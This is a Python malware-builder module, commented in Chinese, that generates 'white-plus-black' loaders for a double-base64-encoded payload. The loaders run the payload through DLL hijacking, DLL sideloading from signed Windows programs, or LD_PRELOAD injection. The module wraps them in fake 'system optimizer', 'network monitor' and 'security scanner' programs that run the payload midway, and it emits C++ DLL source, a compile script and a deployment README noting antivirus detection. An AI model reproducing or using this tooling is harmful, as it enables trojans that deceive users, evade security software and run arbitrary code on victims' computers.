# -*- coding: utf-8 -*-
"""
白加黑模块
实现白加黑技术 - 使用合法白文件加载恶意黑载荷
"""
import os
import base64
import random
import string


def generate_white_black_template():
    """生成白加黑模板代码"""
    template = '''
import os
import sys
import base64
import ctypes
import subprocess
import tempfile
import time
from ctypes import wintypes

class WhiteBlackLoader:
    """白加黑加载器"""
    
    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
        
    def decode_payload(self, encoded_data):
        """解码载荷数据"""
        try:
            # 多层解码
            decoded = base64.b64decode(encoded_data)
            decoded = base64.b64decode(decoded)
            return decoded
        except Exception:
            return None
    
    def write_to_file(self, data, filename):
        """将数据写入文件"""
        try:
            filepath = os.path.join(self.temp_dir, filename)
            with open(filepath, 'wb') as f:
                f.write(data)
            return filepath
        except Exception:
            return None
    
    def execute_with_legit_process(self, payload_path, legit_process="notepad.exe"):
        """使用合法进程执行载荷"""
        try:
            if os.name == 'nt':  # Windows
                # 方法1: DLL劫持
                return self.dll_hijacking(payload_path, legit_process)
            else:  # Linux/Unix
                # 方法2: LD_PRELOAD
                return self.ld_preload_injection(payload_path)
        except Exception:
            return False
    
    def dll_hijacking(self, payload_path, target_process):
        """DLL劫持技术"""
        try:
            # 查找目标进程的DLL依赖
            common_dlls = [
                "version.dll", "dwmapi.dll", "uxtheme.dll", 
                "propsys.dll", "profapi.dll", "devobj.dll"
            ]
            
            # 选择一个常见但可能缺失的DLL
            target_dll = random.choice(common_dlls)
            
            # 创建恶意DLL
            dll_content = self.create_malicious_dll(payload_path)
            dll_path = os.path.join(os.path.dirname(target_process), target_dll)
            
            # 写入DLL
            if self.write_to_file(dll_content, target_dll):
                # 启动目标进程
                subprocess.Popen([target_process])
                return True
            return False
        except Exception:
            return False
    
    def create_malicious_dll(self, payload_path):
        """创建恶意DLL"""
        # 这里应该生成一个真正的DLL，为简化示例，返回payload内容
        try:
            with open(payload_path, 'rb') as f:
                return f.read()
        except Exception:
            return b""
    
    def ld_preload_injection(self, payload_path):
        """LD_PRELOAD注入技术"""
        try:
            # 创建共享库
            so_content = self.create_malicious_so(payload_path)
            so_path = os.path.join(self.temp_dir, "libhook.so")
            
            if self.write_to_file(so_content, "libhook.so"):
                # 设置LD_PRELOAD环境变量
                env = os.environ.copy()
                env['LD_PRELOAD'] = so_path
                
                # 启动合法进程
                subprocess.Popen(["/bin/ls"], env=env)
                return True
            return False
        except Exception:
            return False
    
    def create_malicious_so(self, payload_path):
        """创建恶意共享库"""
        # 简化版本，实际需要编译真正的共享库
        try:
            with open(payload_path, 'rb') as f:
                return f.read()
        except Exception:
            return b""
    
    def sideloading_technique(self, payload_data):
        """DLL侧加载技术"""
        try:
            # 查找系统中的合法签名程序
            legit_programs = [
                "C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe",
                "C:\\\\Windows\\\\System32\\\\mmc.exe",
                "C:\\\\Windows\\\\System32\\\\eventvwr.exe",
                "C:\\\\Windows\\\\System32\\\\dxdiag.exe"
            ]
            
            for program in legit_programs:
                if os.path.exists(program):
                    return self.perform_sideloading(program, payload_data)
            return False
        except Exception:
            return False
    
    def perform_sideloading(self, target_exe, payload_data):
        """执行侧加载"""
        try:
            # 获取目标程序目录
            target_dir = os.path.dirname(target_exe)
            target_name = os.path.basename(target_exe)
            
            # 创建副本目录
            work_dir = os.path.join(self.temp_dir, "legit_app")
            os.makedirs(work_dir, exist_ok=True)
            
            # 复制合法程序
            import shutil
            legit_copy = os.path.join(work_dir, target_name)
            shutil.copy2(target_exe, legit_copy)
            
            # 创建恶意DLL
            dll_name = self.get_sideload_dll_name(target_exe)
            dll_path = os.path.join(work_dir, dll_name)
            
            # 写入载荷作为DLL
            with open(dll_path, 'wb') as f:
                f.write(payload_data)
            
            # 启动程序
            subprocess.Popen([legit_copy], cwd=work_dir)
            return True
        except Exception:
            return False
    
    def get_sideload_dll_name(self, exe_path):
        """获取可侧加载的DLL名称"""
        # 根据不同程序返回可能的DLL名称
        dll_mapping = {
            "iexplore.exe": "mscoree.dll",
            "mmc.exe": "mmcndmgr.dll", 
            "eventvwr.exe": "elsext.dll",
            "dxdiag.exe": "dxdiagn.dll"
        }
        
        exe_name = os.path.basename(exe_path)
        return dll_mapping.get(exe_name, "version.dll")
    
    def generate_random_name(self, length=8):
        """生成随机名称"""
        import random
        import string
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def execute_payload(self, encoded_payload):
        """执行载荷的主要方法"""
        try:
            # 解码载荷
            payload_data = self.decode_payload(encoded_payload)
            if not payload_data:
                return False
            
            # 写入临时文件
            temp_file = self.generate_random_name() + ".tmp"
            payload_path = self.write_to_file(payload_data, temp_file)
            if not payload_path:
                return False
            
            # 尝试多种白加黑技术
            techniques = [
                lambda: self.sideloading_technique(payload_data),
                lambda: self.execute_with_legit_process(payload_path, "notepad.exe"),
                lambda: self.execute_with_legit_process(payload_path, "calc.exe")
            ]
            
            for technique in techniques:
                try:
                    if technique():
                        # 清理临时文件
                        time.sleep(2)
                        try:
                            os.remove(payload_path)
                        except:
                            pass
                        return True
                except:
                    continue
            
            return False
        except Exception:
            return False

def generate_random_name(length=8):
    """生成随机名称"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# 载荷数据占位符
ENCODED_PAYLOAD = "{ENCODED_PAYLOAD}"

if __name__ == "__main__":
    try:
        loader = WhiteBlackLoader()
        loader.execute_payload(ENCODED_PAYLOAD)
    except Exception:
        pass
'''
    return template


def generate_legitimate_wrapper():
    """生成合法程序包装器"""
    wrapper_templates = [
        {
            "name": "system_optimizer.py",
            "description": "系统优化工具",
            "code": '''
import os
import sys
import time
import threading
import subprocess

class SystemOptimizer:
    """系统优化工具"""
    
    def __init__(self):
        self.running = False
        self.operations = [
            "正在清理临时文件...",
            "正在优化注册表...", 
            "正在清理系统缓存...",
            "正在整理磁盘碎片...",
            "正在更新系统驱动...",
            "优化完成！"
        ]
    
    def show_progress(self):
        """显示优化进度"""
        for i, operation in enumerate(self.operations):
            print(f"[{i+1}/{len(self.operations)}] {operation}")
            time.sleep(2)
            
            # 在第3步时执行真正的载荷
            if i == 2:
                self.execute_hidden_payload()
    
    def execute_hidden_payload(self):
        """执行隐藏载荷"""
        try:
            # 在这里插入白加黑代码
            {WHITE_BLACK_CODE}
        except Exception:
            pass
    
    def start_optimization(self):
        """开始优化"""
        print("=== 系统优化工具 v1.0 ===")
        print("正在启动系统优化进程...")
        time.sleep(1)
        
        self.running = True
        self.show_progress()
        
        print("系统优化完成！")
        time.sleep(3)

if __name__ == "__main__":
    optimizer = SystemOptimizer()
    optimizer.start_optimization()
'''
        },
        {
            "name": "network_monitor.py", 
            "description": "网络监控工具",
            "code": '''
import os
import sys
import time
import threading
import random

class NetworkMonitor:
    """网络监控工具"""
    
    def __init__(self):
        self.monitoring = False
        self.packet_count = 0
    
    def generate_fake_traffic(self):
        """生成虚假网络流量数据"""
        protocols = ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS']
        ips = ['192.168.1.{}', '10.0.0.{}', '172.16.0.{}']
        
        while self.monitoring:
            protocol = random.choice(protocols)
            src_ip = random.choice(ips).format(random.randint(1, 254))
            dst_ip = random.choice(ips).format(random.randint(1, 254))
            port = random.randint(1024, 65535)
            
            self.packet_count += 1
            print(f"[{self.packet_count:06d}] {protocol} {src_ip}:{port} -> {dst_ip}:{port}")
            
            # 在监控过程中执行载荷
            if self.packet_count == 50:
                self.execute_maintenance()
            
            time.sleep(random.uniform(0.1, 0.5))
    
    def execute_maintenance(self):
        """执行维护任务"""
        try:
            print("[INFO] 执行网络维护任务...")
            # 在这里插入白加黑代码
            {WHITE_BLACK_CODE}
        except Exception:
            pass
    
    def start_monitoring(self):
        """开始监控"""
        print("=== 网络流量监控工具 v2.1 ===")
        print("正在初始化网络接口...")
        time.sleep(2)
        
        print("开始监控网络流量...")
        self.monitoring = True
        
        monitor_thread = threading.Thread(target=self.generate_fake_traffic)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\\n监控已停止")
            self.monitoring = False

if __name__ == "__main__":
    monitor = NetworkMonitor()
    monitor.start_monitoring()
'''
        },
        {
            "name": "security_scanner.py",
            "description": "安全扫描工具", 
            "code": '''
import os
import sys
import time
import random
import threading

class SecurityScanner:
    """安全扫描工具"""
    
    def __init__(self):
        self.scanning = False
        self.vulnerabilities = [
            "检查弱密码...",
            "扫描开放端口...",
            "检测恶意软件...",
            "分析系统漏洞...",
            "验证防火墙配置...",
            "检查系统更新..."
        ]
    
    def perform_scan(self):
        """执行安全扫描"""
        print("=== 系统安全扫描器 v3.0 ===")
        print("正在启动安全扫描...")
        time.sleep(1)
        
        for i, task in enumerate(self.vulnerabilities):
            print(f"[{i+1}/{len(self.vulnerabilities)}] {task}")
            
            # 模拟扫描过程
            for j in range(random.randint(3, 8)):
                print(".", end="", flush=True)
                time.sleep(0.5)
            
            print(" 完成")
            
            # 在第4步执行载荷
            if i == 3:
                self.perform_deep_analysis()
        
        print("\\n扫描完成！未发现安全威胁。")
    
    def perform_deep_analysis(self):
        """执行深度分析"""
        try:
            print("正在执行深度安全分析...")
            # 在这里插入白加黑代码
            {WHITE_BLACK_CODE}
        except Exception:
            pass
    
    def generate_report(self):
        """生成扫描报告"""
        print("\\n=== 扫描报告 ===")
        print("扫描时间:", time.strftime("%Y-%m-%d %H:%M:%S"))
        print("扫描项目: 6")
        print("发现问题: 0")
        print("系统状态: 安全")
        print("建议: 保持当前安全配置")

if __name__ == "__main__":
    scanner = SecurityScanner()
    scanner.perform_scan()
    scanner.generate_report()
'''
        }
    ]
    
    return random.choice(wrapper_templates)


def create_white_black_payload(encrypted_code, key, output_dir, wrapper_type="auto"):
    """创建白加黑载荷文件"""
    try:
        # 生成白加黑模板代码
        white_black_template = generate_white_black_template()
        
        # 双重Base64编码载荷
        encoded_payload = base64.b64encode(
            base64.b64encode(encrypted_code.encode()).decode().encode()
        ).decode()
        
        # 替换载荷占位符
        white_black_code = white_black_template.replace("{ENCODED_PAYLOAD}", encoded_payload)
        
        # 选择合法程序包装器
        if wrapper_type == "auto":
            wrapper = generate_legitimate_wrapper()
        else:
            # 可以根据需要添加特定类型的包装器
            wrapper = generate_legitimate_wrapper()
        
        # 将白加黑代码插入包装器
        final_code = wrapper["code"].replace("{WHITE_BLACK_CODE}", white_black_code)
        
        # 生成文件名
        filename = wrapper["name"]
        filepath = os.path.join(output_dir, filename)
        
        # 写入文件
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(final_code)
        
        return filepath, wrapper["description"]
        
    except Exception as e:
        raise Exception(f"创建白加黑载荷失败: {str(e)}")


def create_dll_sideloading_payload(encrypted_code, key, output_dir):
    """创建DLL侧加载载荷"""
    try:
        # DLL侧加载模板
        dll_template = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// 载荷数据
const char* g_payload = "{ENCODED_PAYLOAD}";

// DLL入口点
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{{
    switch (ul_reason_for_call)
    {{
    case DLL_PROCESS_ATTACH:
        // 在DLL加载时执行载荷
        ExecutePayload();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }}
    return TRUE;
}}

// 执行载荷
void ExecutePayload()
{{
    // 解码并执行Python载荷
    // 这里需要嵌入Python解释器或使用其他方式执行
    system("python -c \\"import base64; exec(base64.b64decode(base64.b64decode('{ENCODED_PAYLOAD}').decode()).decode())\\"");
}}

// 导出函数 (用于侧加载)
extern "C" __declspec(dllexport) void DummyFunction()
{{
    // 空函数，用于满足DLL导出要求
}}
'''
        
        # 编码载荷
        encoded_payload = base64.b64encode(
            base64.b64encode(encrypted_code.encode()).decode().encode()
        ).decode()
        
        # 替换载荷
        dll_source = dll_template.replace("{ENCODED_PAYLOAD}", encoded_payload)
        
        # 生成文件
        cpp_file = os.path.join(output_dir, "sideload_payload.cpp")
        with open(cpp_file, 'w', encoding='utf-8') as f:
            f.write(dll_source)
        
        # 生成编译脚本
        compile_script = '''@echo off
echo 正在编译DLL侧加载载荷...
cl /LD sideload_payload.cpp /Fe:version.dll
echo 编译完成！
echo 使用方法：
echo 1. 将 version.dll 放到目标程序目录
echo 2. 运行目标程序即可触发载荷
pause
'''
        
        bat_file = os.path.join(output_dir, "compile_dll.bat")
        with open(bat_file, 'w', encoding='utf-8') as f:
            f.write(compile_script)
        
        return cpp_file, bat_file
        
    except Exception as e:
        raise Exception(f"创建DLL侧加载载荷失败: {str(e)}")


def create_hijacking_payload(encrypted_code, key, output_dir):
    """创建DLL劫持载荷"""
    try:
        # 常见的可劫持DLL列表
        hijackable_dlls = [
            "version.dll",
            "dwmapi.dll", 
            "uxtheme.dll",
            "propsys.dll",
            "profapi.dll",
            "devobj.dll",
            "wtsapi32.dll",
            "msimg32.dll"
        ]
        
        created_files = []
        
        for dll_name in hijackable_dlls[:3]:  # 创建前3个
            # 创建DLL源码
            dll_code = f'''
#include <windows.h>

const char* payload = "{base64.b64encode(base64.b64encode(encrypted_code.encode()).decode().encode()).decode()}";

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {{
        // 执行载荷
        system("python -c \\"import base64; exec(base64.b64decode(base64.b64decode('%s').decode()).decode())\\"", payload);
    }}
    return TRUE;
}}

// 转发函数 (确保原始DLL功能正常)
#pragma comment(linker, "/EXPORT:GetFileVersionInfoA=C:\\\\Windows\\\\System32\\\\{dll_name}.GetFileVersionInfoA,@1")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoW=C:\\\\Windows\\\\System32\\\\{dll_name}.GetFileVersionInfoW,@2")
'''
            
            cpp_file = os.path.join(output_dir, f"hijack_{dll_name.replace('.dll', '.cpp')}")
            with open(cpp_file, 'w', encoding='utf-8') as f:
                f.write(dll_code)
            
            created_files.append(cpp_file)
        
        # 创建使用说明
        readme = '''
DLL劫持载荷使用说明
==================

1. 编译DLL文件:
   cl /LD hijack_*.cpp /Fe:[对应的DLL名].dll

2. 部署步骤:
   - 找到目标程序安装目录
   - 将编译的DLL复制到程序目录
   - 运行目标程序

3. 常见目标程序:
   - notepad.exe (记事本)
   - calc.exe (计算器)  
   - mspaint.exe (画图)
   - 任何第三方软件

4. 注意事项:
   - 确保DLL名称与目标程序需要的DLL匹配
   - 在有AV保护的环境中可能被检测
   - 建议结合其他技术使用
'''
        
        readme_file = os.path.join(output_dir, "DLL_Hijacking_README.txt")
        with open(readme_file, 'w', encoding='utf-8') as f:
            f.write(readme)
        
        created_files.append(readme_file)
        
        return created_files
        
    except Exception as e:
        raise Exception(f"创建DLL劫持载荷失败: {str(e)}")
